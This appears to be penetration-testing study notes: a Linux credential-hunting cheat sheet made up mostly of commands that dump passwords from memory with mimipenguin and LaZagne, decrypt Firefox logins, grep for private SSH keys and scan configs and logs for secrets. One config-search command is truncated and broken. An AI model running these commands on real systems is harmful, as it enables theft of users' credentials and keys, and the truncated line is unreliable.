#linux #password-hunting #mimipenguin #LaZange #llinPEAS  


---

## Linux Password Hunting

| Command                             | Description                          |
| ----------------------------------- | ------------------------------------ |
| `cat /etc/crontab`                  | Read `cron jobs`                     |
| `ls -la /etc/cron.*/`               | List `cron jobs`                     |
| `tail -n5 /home/*/.bash*`           | Search `Bash history`                |
| `sudo python2.7 laZagne.py all`     | Search `memory` for credentials      |
| `sudo python3 mimipenguin.py`       | Search `memory` for credentials      |
| `sudo python2.7 laZagne.py browser` | Search `browsers` for credentials    |
| `python3.9 firefox_decrypt.py`      | Decrypt `firefox` stored credentials |
| `./linpeas.sh`                      | Search for credentials and vulnerabilities                                    |


#### Configs

Search for `config` files
```
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v
```

Search for `keywords in config` files (from saved file of previous command) 
```
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

---
#### Databases

Search for `databes`
```
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

---
#### Notes

Search for `txt` files (like notes)
```
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

---
#### Scripts

Search for `scripts`
```
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

---
#### SSH Keys

Search for `private SSH keys`
```
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

Search for `public SSH keys`
```
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

---
#### Logs

Search for `logs`
```
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

---
#### Memory and Cache

| Examples       | Examples       | Examples  | Examples    |
| -------------- | -------------- | --------- | ----------- |
| Chromium-based | CLI            | Mozilla   | Thunderbird |
| Git            | Env_variable   | Grub      | Fstab       |
| AWS            | Filezilla      | Gftp      | SSH         |
| Apache         | Shadow         | Docker    | KeePass     |
| Mimipy         | Sessions       | Keyrings  |             |
| WiFi           | Wpa_supplicant | Libsecret | Kwallet     |
|                |                |           |             |
|                |                |           |             |

| Name        | Description                     | Link                                        |
| ----------- | ------------------------------- | ------------------------------------------- |
| mimipenguin | Search `memory` for credentials | https://github.com/huntergregal/mimipenguin |
| Lazange     | Search `memory` for credentials | https://github.com/AlessandroZ/LaZagne                                            |

---
#### Browsers

#### Firefox Stored Credentials

  Firefox Stored Credentials

```
ls -l .mozilla/firefox/ | grep default 
```
```
drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

  Firefox Stored Credentials

```
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

---


